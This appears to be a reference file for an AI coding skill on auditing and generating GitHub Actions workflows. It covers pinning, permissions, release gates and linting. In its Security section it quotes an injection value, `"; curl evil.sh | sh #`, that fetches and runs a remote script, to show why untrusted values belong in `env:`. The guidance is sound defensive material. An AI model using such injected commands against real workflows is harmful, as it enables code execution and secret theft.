# GitHub Workflow Reference

This is a reference file — not a standalone skill. It is loaded on demand by
the dev-skills skill (`SKILL.md`) in the same way as `SECURITY_REFERENCE.md`,
`QUALITY_REFERENCE.md`, and `SHELL_REFERENCE.md`. It provides the workflow
selection and audit procedures, the linting rules, and the best practices that
apply to every template. The nine templates themselves are separate
`WORKFLOW_<ENVIRONMENT>.md` files, loaded one at a time by the environment
detection in Step 1 — see "Workflow templates" below. The primary skill decides
when to load this file; this file decides which template comes with it.

**Loaded by the primary skill when:**
- session start (step 6) detects a missing CI build check or release workflow
- the user asks to create, update, or review a GitHub Actions workflow
- the user asks to audit existing workflows ("audit my workflows", "review my
  CI", "check my GitHub Actions")
- Gate 6 needs a release workflow and none exists

---

## Workflow audit

When the user asks to audit, review, or check existing workflows — or when
session start detects workflows that exist but may have issues — read every
`.yml` file in `.github/workflows/` and evaluate each against the
[workflow review checklist](#workflow-review-checklist) below.

### Audit procedure

1. **Discover all workflows:**
   ```
   ls -la .github/workflows/*.yml 2>/dev/null
   ```

2. **Read and classify each workflow:**
   - **Build check** — triggers on `push` or `pull_request` to main branches
   - **Release workflow** — triggers on tag push (`on: push: tags:`)
   - **Deployment** — deploys to infrastructure
   - **Scheduled** — cron-triggered maintenance
   - **Manual** — `workflow_dispatch` only

3. **Run the review checklist** against every workflow. Report findings using
   the same severity levels as the security scan:
   - 🚨 **Critical** — unpinned third-party actions (supply-chain risk),
     secrets echoed in `run:` blocks, `permissions: write-all`, missing
     tag-on-default-branch check in release workflows, missing tag/version
     match check in release workflows (same class of failure: something
     gets published that was never the release), `${{ }}` expression
     interpolated directly into a `run:` script instead of passed through `env:`,
     a secret written to disk (keystore, `.npmrc`, credentials file) before a
     dependency install step, where every package's install scripts can read it
   - ⚠️ **High** — `persist-credentials: true` (or missing, which defaults to
     true), no concurrency groups (race conditions), no timeouts (stuck builds
     waste runner minutes), release workflow with `cancel-in-progress: true`
     (can cancel a release mid-flight), release workflow that checks the tag is
     on the default branch but never checks whether CI actually passed for that
     commit (unless it runs the project's full validation itself and a
     comment says so — the CI-passed exemption below), no `permissions:`
     block (every job gets the repo's default token scope), a first-party
     action (`actions/*`, `github/*`) on a branch ref such as `@main`, a
     Docker release that puts a version tag on an image no scan has passed
     (`WORKFLOW_DOCKER.md`: push by digest, Trivy gate, then tag)
   - 📝 **Medium** — CI reimplements build inline instead of calling project
     scripts, no `set -euo pipefail` in multi-line run blocks, no artifact
     verification after upload, CI trigger is a bare `push:` (also matches tag
     pushes — runs the suite twice on release) instead of `branches: ['**']`,
     no `lint-workflows.yml` for a repo with multiple workflow files, a
     release job re-running a check (lint, shellcheck, full suite) the gate
     job already required CI to have passed for that exact commit, a Gradle
     build with no wrapper validation (`setup-gradle` with
     `validate-wrappers: false`, or no `setup-gradle`/`wrapper-validation`
     step before the first `./gradlew`), expensive jobs (multi-OS matrix,
     browser tests, image or installer builds) with no change detection, so
     a docs-only commit runs them all
   - 💡 **Low** — a cheap suite with no change detection, missing shellcheck for projects with shell scripts, no
     release notes extraction, actions pinned to version tags instead of SHAs
     (first-party GitHub actions)

4. **Check for missing workflows.** After auditing what exists, check what's
   missing per the environment detection table and report the gaps. No
   `.github/dependabot.yml`, or one missing an ecosystem the repo uses
   (`github-actions` plus each package manager), is a 📝 Medium finding,
   not an offer: without it SHA pins and packages drift silently
   (`WORKFLOW_DEPENDABOT.md` has the config). Then
   check the four supply-chain guards below. Each one is an **offer, not a
   finding**: ask once, and record the answer on the audit's evidence line
   (`SECURITY_GATE.md`, "Workflow audit"), so a declined guard is a decision
   on the record and is not offered again until the project changes shape.

   | Guard | Say it like this | Recommend it when |
   |---|---|---|
   | **Dependency review** | "Warns on a pull request that adds a library with a known security hole, before it's merged." Pair it with a weekly scheduled audit (`osv-scanner` or the ecosystem's own) that reports rather than blocks, for holes found after merge | the repo has a package manifest or lockfile. No packages: say it doesn't apply, don't offer it |
   | **CodeQL** | "GitHub's free code scanner. It reads your code on every pull request and flags bug patterns attackers use." | the app takes outside input (a web server, API, login, file uploads) in a language CodeQL reads (JavaScript/TypeScript, Python, Java/Kotlin, C#, Go, Ruby, Swift, C/C++). Small scripts or docs: low value, say so |
   | **Secret scanning** | "Blocks a push that contains a password or API key, before it reaches GitHub." Push protection is one switch in the repo settings (**Settings → Advanced Security → Push protection**), no code | always: it costs nothing on public repos and stops the most expensive mistake |
   | **Build provenance** | "A signed record proving each download was built by your release workflow from a specific commit, so users can check it wasn't swapped." | the release publishes something people download and run (an APK, installer, binary, image, package) |

   **Ask it the way the user can answer it**: one question, the recommended
   guards first and labeled "(Recommended)", each option carrying its
   "Say it like this" line and why it fits *this* repo's code ("your Python
   API takes form input"). A guard that doesn't apply is stated in one line,
   not offered. Never offer a bare list of tool names.

   Settings-based guards (CodeQL default setup, push protection) aren't
   visible in `.github/workflows/`: check them through the API where a
   credential reaches it, and otherwise ask the user instead of reporting
   them missing.

5. **Check for drift.** If both a local dev workflow and CI exist, verify
   that CI calls the project's own scripts rather than reimplementing inline.

6. **Output the audit report:**
   ```
   Workflow audit: .github/workflows/
   
   ci.yml (build check — push/PR)
     ✅ Actions pinned to SHAs
     ✅ persist-credentials: false
     ⚠️ No timeout-minutes on build job
     📝 Build is inline — should call scripts/build.sh
   
   release.yml (release — tag push)
     🚨 Uses actions/checkout@v4 (unpinned version tag)
     ✅ Tag-on-default-branch check present
     ✅ Concurrency group with cancel-in-progress: false
     💡 No shellcheck step
   
   Missing:
     None — both build check and release workflows present
     Offered: dependency review, CodeQL — declined 2026-09-27 (no manifest, Bash only)
   
   Summary: 1 Critical, 1 High, 1 Medium, 1 Low across 2 workflows
   ```

---

## Workflow selection procedure

When a project needs a workflow, **detect the environment first, then ask all
questions in a single turn.** Do not drip-feed questions across multiple
exchanges — the user should be able to answer everything at once.

### Step 0 — Determine whether code blocks need a `cd`

Presented blocks never carry a `cd`, in any session: every block assumes the
user's terminal is already in the repo, and its label names where to run it
(`SHELL_REFERENCE.md`, "Every presented block"). Don't ask for a clone path.
This applies to every code block produced by this reference file: presented
git commands, workflow file creation commands, and any other terminal
instructions.

### Step 1 — Detect the project environment

Scan the repo for environment signals. Check these in order and pick the
**first match** (a project can match multiple — pick the primary one, note
the others):

| Environment | Signals | Template |
|---|---|---|
| **Docker** | `Dockerfile`, `docker-compose.yml`, `.dockerignore`, `compose.yaml` | `WORKFLOW_DOCKER.md` |
| **Windows app** | `.csproj`, `.sln`, `.vbproj`, `.fsproj`, `*.xaml`, `Setup.iss`, `*.wixproj`, `*.nsis`, MSBuild files | `WORKFLOW_WINDOWS.md` |
| **Hybrid app (Capacitor/Ionic)** | `capacitor.config.ts`/`.json`, `@capacitor/core` or `@ionic/*` in `package.json`, alongside an `android/` Gradle project | `WORKFLOW_HYBRID.md` |
| **Android app** | `build.gradle`, `build.gradle.kts`, `settings.gradle`, `AndroidManifest.xml`, `app/` directory with Gradle wrapper | `WORKFLOW_ANDROID.md` |
| **Linux app** | `Makefile`, `CMakeLists.txt`, `meson.build`, `configure.ac`, `.deb`/`.rpm` packaging, `setup.py`/`pyproject.toml` with entry points | `WORKFLOW_LINUX.md` |
| **Home Assistant** | `manifest.json` with `"domain"` key, `hacs.json`, `custom_components/` directory | `WORKFLOW_HOMEASSISTANT.md` |
| **Python package** | `pyproject.toml`, `setup.py`, `setup.cfg` with package metadata | `WORKFLOW_PYTHON.md` |
| **Node.js** | `package.json` with build scripts | `WORKFLOW_NODEJS.md` |
| **Shell scripts** | `*.sh`, `*.bash` files as primary content, no compiled output | `WORKFLOW_SCRIPTS.md` |

If no signal matches, ask what the project is.

**Read only the matching template file(s).** Each is read in full, so loading a
template the project does not match costs the tokens for content that is never
used. A project spanning two environments loads two; never all nine.

### Step 2 — Check for existing workflows

Before suggesting anything, scan `.github/workflows/` for existing files:

```
ls -la .github/workflows/ 2>/dev/null
```

For each existing workflow, read it and classify:
- **Build check** — triggers on `push` or `pull_request` to main branches
- **Release workflow** — triggers on tag push (`on: push: tags:`)
- **Other** — deployment, scheduled, manual dispatch

Report what exists before suggesting additions:

> Found: `.github/workflows/ci.yml` (build check on push/PR)
> Missing: release workflow (no tag-triggered workflow detected)

If both exist and are well-structured, say so and stop — don't suggest
replacements for working workflows.

### Step 3 — Ask all questions in one turn

Based on the detected environment and what's missing, ask everything the user
needs to answer **in a single message.** Use `AskUserQuestion` with all
relevant questions batched together.

**Common questions for all environments:**

1. **Docker registry** (Docker only): Which registry? (Docker Hub / GitHub
   Container Registry / AWS ECR / other)
2. **Artifact attachment** (when ambiguous): Should compiled artifacts be
   attached to the GitHub release for download?
3. **Signing** (Windows / Android): What signing secrets are needed?
   (certificate name, keystore, etc.)
4. **Release notes source**: Extract from CHANGELOG.md, or generate from PR
   description?
5. **Branch protection**: Which branch is the default? (main / master / other)
6. **Dev releases**: Do you want to be able to push pre-release tags from
   feature branches for testing? (e.g., `v1.0.0-dev.1` builds from your
   working branch, marked as pre-release on GitHub). On yes, load
   `WORKFLOW_DEVRELEASE.md`
7. **Workflow linting**: Add `lint-workflows.yml` (runs `actionlint` on
   `.github/workflows/**` changes)? Recommended whenever any workflow is being
   added — see [Workflow linting](#workflow-linting).

**Environment-specific questions to include in the same turn:**

| Environment | Additional questions |
|---|---|
| Docker | Image name? Multi-arch build (amd64/arm64)? |
| Windows | Build tool (MSBuild / dotnet)? Framework version? Installer type (MSI / NSIS / InnoSetup / none)? |
| Linux | Build system (make / cmake / meson / python)? Package format (none / .deb / .rpm / tarball)? |
| Home Assistant | HACS validation needed? Minimum HA version? |
| Android | Min SDK version? Target SDK? Signing keystore configured? Build variant (debug / release)? |
| Scripts | Primary shell (bash / sh / zsh)? Any interpreted languages to lint (Python / Ruby)? |

**Remember answers for the repo.** Once the user answers whether artifacts
should be attached, commit that decision to the CLAUDE.md or project
configuration so it is not asked again. Use the `import-memory` skill or
write the decision to `.claude/settings.json` project memory.

### Step 4 — Generate, validate, and present

After the user answers the Step 3 questions:

1. **Generate the workflow files** from the matching template file, adapted with
   the user's answers (registry, build tool, artifact preference, dev release
   support, etc.)
2. **Run the [review checklist](#workflow-review-checklist)** against the
   generated workflow to catch any missed best practices
3. **Present the files to the user for review** before writing them. Show
   the complete YAML and explain what each section does — this is a teaching
   moment for the citizen coder
4. **Write the files** only after the user approves. Commit discipline
   (Section 1 of SKILL.md) applies — never auto-commit workflow files
5. **Recommend Dependabot** if `.github/dependabot.yml` doesn't exist yet —
   suggest it alongside the new workflows, with an entry for **every ecosystem
   in the repo**, not just `github-actions` (`WORKFLOW_DEPENDABOT.md`)
6. **Recommend `lint-workflows.yml`** if it doesn't exist yet — suggest it
   alongside the new workflows, the same way Dependabot is suggested. See
   [Workflow linting](#workflow-linting).

---

## Workflow linting

A dedicated, fast, static-analysis-only workflow for the repo's own
`.github/workflows/**` files: YAML syntax, expression/context typos, job
dependency shape, and a shellcheck pass over `run:` blocks — all via
[`actionlint`](https://github.com/rhysd/actionlint), without starting a
runner environment for the app itself. Offer it whenever a CI or release
workflow is being created or audited, the same way Dependabot is offered —
it's what lets the CI build check safely exclude
`.github/workflows/**` from its own trigger paths without losing coverage for
edits to the workflow files themselves (a broken YAML file or a typo'd
`${{ }}` expression is the common mistake for a workflow edit; actionlint
catches it without waiting for the app's own suite to run).

`actionlint` ships as a binary, not a GitHub Action, so it can't be pinned to
a commit SHA the usual way. Pin the version and verify the release's own
checksum before executing it — download an unpinned or unverified binary and
you're running someone else's code with this job's token:

```yaml
name: Lint workflows

on:
  push:
    branches: ['**']
    paths:
      - '.github/workflows/**'
  pull_request:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read

concurrency:
  group: lint-workflows-${{ github.ref }}
  cancel-in-progress: true

jobs:
  actionlint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Download actionlint
        env:
          # Bumped by hand; checksum copied from the release's own
          # *_checksums.txt, not computed after the fact, so a tampered or
          # substituted binary is refused rather than silently trusted.
          ACTIONLINT_VERSION: 1.7.12
          ACTIONLINT_SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
        run: |
          set -euo pipefail
          curl -fsSL -o actionlint.tar.gz \
            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  actionlint.tar.gz" | sha256sum -c -
          tar xzf actionlint.tar.gz actionlint

      - name: Run actionlint
        run: ./actionlint -color
```

**Adaptation notes:**
- Check [actionlint's releases page](https://github.com/rhysd/actionlint/releases)
  for the current version and its published `_checksums.txt` when bumping —
  never write the checksum from memory.
- This workflow is why the CI build check's own trigger can safely carry
  skip workflow-file changes (see Reliability, above) — without
  it, that exclusion would leave workflow-file edits completely unchecked.

---

## Template best practices

Every generated workflow MUST follow these practices. They are non-negotiable
and match the patterns already used in this repo's own workflows.

### Security

- **Pin actions to commit SHAs**, not version tags. A version tag is mutable
  and can be repointed. Include the version as a comment:
  ```yaml
  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  ```
  First-party GitHub actions (`actions/*`) should also be pinned to SHAs.
  Third-party and community actions (`docker/*`, etc.) must always be pinned.
  **Exception: `hacs/action`.** HACS's own guidance is to run it unpinned at
  `@main` — the action always validates against HACS's current rules, and a
  pinned snapshot would silently validate against stale ones and pass
  integrations that no longer meet the real requirements. This is the one
  template action left unpinned, and it is intentional, not an oversight.
  **It does not cover hassfest.** `home-assistant/actions/hassfest` has no
  release tags, so it is SHA-pinned to master's head with a `# master <date>`
  comment (`WORKFLOW_HOMEASSISTANT.md`), and `@master` is a finding.
- **`persist-credentials: false`** on checkout unless the job needs to push.
  Credentials sitting in `.git/config` are attack surface while scripts run.
- **Least-privilege `permissions:`** — declare only what the job needs. Never
  use `permissions: write-all`. Common patterns:
  ```yaml
  permissions:
    contents: read          # build checks
  permissions:
    contents: write         # release creation
    packages: write         # container registry push
    id-token: write         # OIDC trusted publishing (PyPI, cosign)
  ```
- **Prefer OIDC trusted publishing** over API key secrets where supported
  (PyPI, Google Cloud Workload Identity, cosign image signing). Requires
  `id-token: write` permission and a configured environment.
- **Never echo secrets.** Use `${{ secrets.* }}` only in `env:` blocks, never
  in `run:` command strings where they appear in logs. Security-sensitive
  materials (PFX certs, keystores) decoded from secrets must be explicitly
  deleted after use.
- **Verify tag is on the default branch** before releasing. Without this, a
  tag on any commit — including an unreviewed branch — publishes a release
  from unreviewed code:
  ```yaml
  - name: Verify tag is on default branch
    env:
      DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
    run: |
      if ! git merge-base --is-ancestor "$GITHUB_SHA" "origin/$DEFAULT_BRANCH"; then
        echo "Tag $GITHUB_REF_NAME is not on $DEFAULT_BRANCH. Releases come from the default branch only."
        exit 1
      fi
  ```
  **This alone is not enough.** Being on the default branch proves the commit
  was merged — it says nothing about whether CI ever ran against it, or
  passed. A tag pushed against a commit whose CI went red publishes exactly
  the same way a green one does unless something checks the run's conclusion.
  Pair it with a **CI-status gate**, in its own job so the polling step
  carries only the read permissions it needs, never the release job's
  `contents: write`/`packages: write`:
  ```yaml
  jobs:
    gate:
      runs-on: ubuntu-latest
      permissions:
        actions: read
        contents: read
      steps:
        - name: Require a passing CI run for this commit
          env:
            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
            REPO: ${{ github.repository }}
            SHA: ${{ github.sha }}
          run: |
            set -euo pipefail
            runs=$(gh api \
              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
              --jq '.workflow_runs[] | "\(.status) \(.conclusion)"')
            printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }' \
              || { echo "::error::CI never passed for ${SHA}."; exit 1; }
    release:
      needs: gate
      # ...
  ```
  The full version — with a wait loop for a run still in progress, since
  tagging right after pushing the branch is normal and CI takes minutes — is
  in every release template below. Rerunning the whole suite on tag push
  instead would re-prove what the branch push already proved, at the cost of
  the suite's full runtime on every release; asking the API what already
  happened is the cheaper and equally strict check.
- **Verify the tag matches the version declared in the tagged commit.** The
  two checks above prove the commit is *good* — merged, and CI passed for it.
  Neither proves it is the *release*. A tag pushed before its release PR
  merges lands on the previous version's commit, which is already on the
  default branch with CI already green, and passes both checks while
  publishing the old code under the new tag:
  ```yaml
  - name: Verify tag matches the version in the tagged commit
    env:
      TAG: ${{ github.ref_name }}
    run: |
      set -euo pipefail
      version="<extractor for this ecosystem — see the release template below>"
      if [ -z "$version" ]; then
        echo "::error::No version found. Refusing to publish."
        exit 1
      fi
      if [ "v${version}" != "$TAG" ]; then
        echo "::error::Tag $TAG is on a commit that declares ${version}. Merge the release first, then tag the merged commit."
        exit 1
      fi
  ```
  Each release template below has its own extractor for where that
  ecosystem keeps its version — `package.json`, `pyproject.toml`, a manifest,
  a `VERSION` file. Use tools already on the runner; don't add a dependency
  just to read a version string.

  **Tag-derived or computed versions are exempt.** Tools like
  `setuptools-scm` compute the version *from* the tag, so it matches by
  construction — and some Android/Flutter builds derive `versionName` from
  `git describe` or a build variable rather than a literal string in
  `build.gradle`. Don't generate a check that can't fail; say in the
  workflow's comments that the project uses computed versioning instead.

  **A job with no checkout** (a lean gate job that never runs
  `actions/checkout`) can't read the file from disk — fetch it through the
  API at the tagged commit instead:
  ```yaml
  version=$(gh api -H 'Accept: application/vnd.github.raw' \
    "repos/${REPO}/contents/<file>?ref=${SHA}" | <extractor>)
  ```
- **Never interpolate an untrusted or attacker-influenceable value directly
  into a `run:` script.** `${{ github.ref_name }}`, `${{ github.head_ref }}`,
  a PR title, an issue title, or a commit message are template-expanded into
  the script's *text* before the shell ever sees it — a ref or title
  containing `"; curl evil.sh | sh #` becomes code, not data. Read the value
  through `env:` and reference it as a shell variable instead, so it stays a
  string:
  ```yaml
  # bad — the tag name is spliced into the script before bash runs it
  - run: echo "Releasing ${{ github.ref_name }}"

  # good — the tag name arrives as an environment variable's value
  - env:
      TAG: ${{ github.ref_name }}
    run: echo "Releasing $TAG"
  ```
  This matters most for values a fork PR or an external contributor can set
  (PR title, branch name, issue title) — `pull_request_target` combined with
  this pattern is a known path to secret exfiltration and repo write access.
- **Environment protection rules** for release jobs. Use GitHub's
  `environment:` feature with deployment protection rules (approval gates,
  branch restrictions) for publish workflows:
  ```yaml
  jobs:
    publish:
      environment:
        name: production
  ```

### Reliability

- **Concurrency groups** — prevent races on the same branch or tag:
  ```yaml
  concurrency:
    group: ci-${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: true    # for build checks
  concurrency:
    group: release-${{ github.ref }}
    cancel-in-progress: false   # NEVER cancel a release in flight
  ```
- **Timeouts on every job.** A stuck build wastes runner minutes. 10–15 min
  for builds, 5 min for linting, 20 min for Docker multi-arch:
  ```yaml
  jobs:
    build:
      timeout-minutes: 15
  ```
- **Fail explicitly.** Add `set -euo pipefail` at the top of multi-line run
  blocks so a mid-script failure doesn't slide past:
  ```yaml
  - run: |
      set -euo pipefail
      make build
      make test
  ```
- **`branches: ['**']`, not a bare `push:`, on the CI trigger.** A bare
  `push:` also matches a tag push — which is exactly what the release
  workflow's tag trigger fires on — so tagging a commit CI already passed on
  the branch push runs the whole suite a second time against nothing new:
  ```yaml
  on:
    push:
      branches: ['**']   # not just `push:` — that also matches tag pushes
    pull_request:
  ```
- **Job-level change detection, so docs-only commits skip the heavy jobs.**
  A first `changes` job diffs the push/PR range (`git diff --name-only` in
  bash, or a SHA-pinned paths-filter action) and outputs `code`; heavy jobs
  get `needs: changes` and `if: needs.changes.outputs.code == 'true'`.
  Skipped jobs count as passing for required status checks, and every commit
  still gets a successful run, so the CI-passed release gate needs no
  workaround. Verify what the suite actually reads before treating a path as
  docs. Workflow-level `paths-ignore` (no run at all) only fits a repo with
  no required checks (`gh api repos/{o}/{r}/branches/{b}/protection -q
  .required_status_checks.contexts`) and no CI-passed release gate: otherwise
  a docs-only PR waits forever on a check that never runs, and the gate finds
  no run for the tagged commit.
- **`DEBIAN_FRONTEND=noninteractive` around any `apt-get install`** on an
  `ubuntu-latest` job. Some packages (`wireshark-common`, `tzdata`, others
  with a postinst debconf prompt) ask an interactive question on install; without
  this the step hangs until the job times out instead of failing fast:
  ```yaml
  - name: Install system packages
    env:
      DEBIAN_FRONTEND: noninteractive
    run: sudo apt-get update && sudo apt-get install -y --no-install-recommends <pkg>
  ```
  Runner-dependent, not target-platform-dependent — it applies to any job
  that runs on `ubuntu-latest` and calls `apt-get`, regardless of what OS the
  project itself targets. Windows-runner jobs use a different package manager
  and don't hit this.

### Structure

- **Two workflows, not one.** A build check (CI) and a release workflow serve
  different gates and trigger on different events. Combining them into one file
  with conditional logic is fragile and hard to read.
- **Reuse the project's own scripts.** CI should call `bash scripts/build.sh`
  or `make test`, not reimplement the build inline. When CI and local dev run
  different code, they drift apart until a release breaks.
- **Release notes from CHANGELOG.md** when the project maintains one. Extract
  the section for the current version. Fall back to PR body or auto-generated
  notes only when no changelog exists.

---

## Workflow templates — one file per environment

The nine templates live in their own files so a project loads only the one it
matches. Detect the environment first (Step 1 of the selection procedure
above), then read **only** the matching file — a Node.js project has no use for
the Android template, and each of these is read in full.

| Environment | Template file |
|---|---|
| Docker / container image | `WORKFLOW_DOCKER.md` |
| Windows app (.NET, WPF, WinForms, packaged .exe) | `WORKFLOW_WINDOWS.md` |
| Linux application (binary, .deb/.rpm, AppImage) | `WORKFLOW_LINUX.md` |
| Home Assistant integration / HACS | `WORKFLOW_HOMEASSISTANT.md` |
| Script collection (shell, PowerShell, Python scripts) | `WORKFLOW_SCRIPTS.md` |
| Hybrid app (Capacitor/Ionic → APK) | `WORKFLOW_HYBRID.md` |
| Android app (Gradle, APK/AAB) | `WORKFLOW_ANDROID.md` |
| Python package (PyPI) | `WORKFLOW_PYTHON.md` |
| Node.js / npm package | `WORKFLOW_NODEJS.md` |

A project can span more than one environment — a Python package with a Docker
image, for example. Load each template that matches, and no others.

Everything that applies to *every* template — the best practices and linting
rules above — stays in this file and applies to whichever template you load.
Two topics have their own file, loaded only when they come up:

| Topic | File |
|---|---|
| Dependabot config, refreshing a SHA pin by hand | `WORKFLOW_DEPENDABOT.md` |
| Dev (pre-)releases from a branch, Cosign image signing | `WORKFLOW_DEVRELEASE.md` |


## Integration with the gate reference files

This reference file supports the workflow detection in `SESSION_START.md`
(step 6) and Gate 6 (`SHIP_REFERENCE.md`). When the skill detects a missing
workflow:

1. **Load this file** (`WORKFLOW_REFERENCE.md`)
2. **Run the detection procedure** (Step 1 above)
3. **Ask all questions in one turn** (Step 3 above)
4. **Generate the workflow** from the matching template file, adapted with the
   user's answers
5. **Validate the generated workflow** — check that:
   - All action references use pinned commit SHAs
   - `persist-credentials: false` is set on checkout
   - Concurrency groups are present
   - Timeouts are set on every job
   - The tag-on-default-branch check is present in release workflows
   - The tag/version match check is present in release workflows (or the
     workflow's comments document why the version is tag-derived/computed
     and exempt)
   - Release notes extraction is present
   - The generated workflow calls the project's own build scripts where they
     exist, rather than reimplementing the build inline

### Workflow review checklist

When reviewing an existing workflow (user request or drift detection), check
every item:

- [ ] Actions pinned to commit SHAs (not version tags)
- [ ] Every pinned SHA **resolves to the tag its comment claims** — not just
      present, matching: `git ls-remote <repo> refs/tags/vX.Y.Z` and compare.
      An annotated tag returns two lines — the tag object and, with `^{}`,
      the commit it points to; the pin must be the commit. A pin matching no
      tag at all is broken (CI silently never runs for that job); a pin
      matching a *different* tag than its comment claims is a suppressed
      upgrade — Dependabot reads the comment, not the SHA, to decide what to
      offer next, so a stale label can hide several real versions of drift
- [ ] `persist-credentials: false` on all checkouts
- [ ] Least-privilege `permissions:` block — present at all: without one,
      every job runs with the repo's default token scope
- [ ] No action on a branch ref (`@main`, `@master`) unless it is a
      documented exemption (`hacs/action` is the only one; hassfest is not
      exempt: pin it to master's head SHA, `WORKFLOW_HOMEASSISTANT.md`)
- [ ] No secret written to disk before a dependency install: decode it after
      `npm ci`/`pip install`/`gradle` resolution, immediately before the step
      that uses it, and delete it in an `if: always()` step
- [ ] Docker releases scan the pushed digest (Trivy, action SHA and binary
      `version:` both pinned) and tag it only after the scan passes
- [ ] **Every job** that runs `./gradlew` validates the wrapper jar first, in
      that job: jobs run on separate runners, often in parallel, so a check in
      one job protects no other. `setup-gradle` v4+ does it by default (don't
      set `validate-wrappers: false`); a job that uses `setup-java`'s
      `cache: gradle` instead adds `gradle/actions/wrapper-validation`
      (`WORKFLOW_ANDROID.md`)
- [ ] Concurrency groups (cancel-in-progress for CI, never for release)
- [ ] Timeouts on all jobs
- [ ] Tag-on-default-branch verification in release workflows
- [ ] Release workflows gate on CI having passed for the tagged commit —
      **exempt** when the release job runs the project's full validation
      itself (e.g. `bash scripts/validate.sh`) and a comment at the gate says
      so; the proof is then the release run, not an earlier CI run
- [ ] Tag/version match verification in release workflows — the tagged
      commit's own declared version equals the tag, or the version is
      tag-derived/computed and documented as exempt
- [ ] Release notes extracted from CHANGELOG.md or PR body
- [ ] Release job doesn't re-run a check the gate job already required to
      pass on this exact commit (lint, shellcheck, the full test suite) —
      the gate's job is proof it already ran and passed; redoing it in the
      release job burns runner time re-proving what's already known
- [ ] CI calls project's own scripts, not inline reimplementations
- [ ] Heavy jobs skip docs-only changes via job-level change detection
      (Reliability), with branch protection read before suggesting `paths-ignore`
- [ ] Secrets used only in `env:` blocks, never in `run:` strings
- [ ] Artifact verification after upload (release workflows)
- [ ] Shell scripts checked with shellcheck (Linux/script projects)
- [ ] `set -euo pipefail` in multi-line run blocks
- [ ] Dependabot configured (`.github/dependabot.yml`) — with an entry for
      GitHub Actions **and** for every package ecosystem the repo uses
- [ ] OIDC trusted publishing used where supported (PyPI, cosign)

---

## Environment-specific artifact rules

These rules determine whether a release MUST have an artifact attached:

| Environment | Artifact required? | Reason |
|---|---|---|
| **Docker** | No (image is pushed to registry) | The artifact IS the pushed image; the GitHub release is just release notes |
| **Windows app** | **Yes — always** | Users download compiled binaries from releases; no other distribution channel |
| **Android app** | **Yes — always** | Users download the APK to install on their device |
| **Linux app (compiled)** | **Yes — always** | Same as Windows — users need the binary |
| **Linux app (interpreted)** | Ask the user | Some projects want a tarball for easy `curl \| tar`; others rely on pip/apt |
| **Home Assistant** | No | HACS pulls directly from the tagged source code |
| **Script collection** | Ask the user | A tarball is convenient but not required; the tagged source is already downloadable |
| **Python package** | Depends | If published to PyPI, no GitHub artifact needed; if not, attach the wheel/sdist |
| **Node.js package** | Depends | If published to npm, no GitHub artifact needed; if not, attach the tarball |

When the answer is "ask the user," ask **once** per repo and commit the
answer to project memory so it is never asked again.
